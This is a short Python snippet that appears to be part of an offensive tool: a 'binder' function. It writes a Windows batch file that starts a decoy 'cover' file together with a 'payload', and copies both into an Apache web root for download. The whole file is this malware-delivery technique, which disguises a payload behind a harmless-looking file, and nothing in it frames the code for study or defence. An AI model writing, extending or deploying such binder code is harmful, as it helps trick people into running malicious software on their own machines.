import shutil
import os

def bind_payload(cover, payload):
    if not cover or not payload:
        return "Missing files"

    # Output bat file
    bat_path = "/var/www/html/bound_file.bat"
    with open(bat_path, 'w') as f:
        f.write(f'start {os.path.basename(cover)}\n')
        f.write(f'start {os.path.basename(payload)}\n')

    # Copy cover and payload to apache directory
    shutil.copy(cover, "/var/www/html/")
    shutil.copy(payload, "/var/www/html/")
    return bat_path
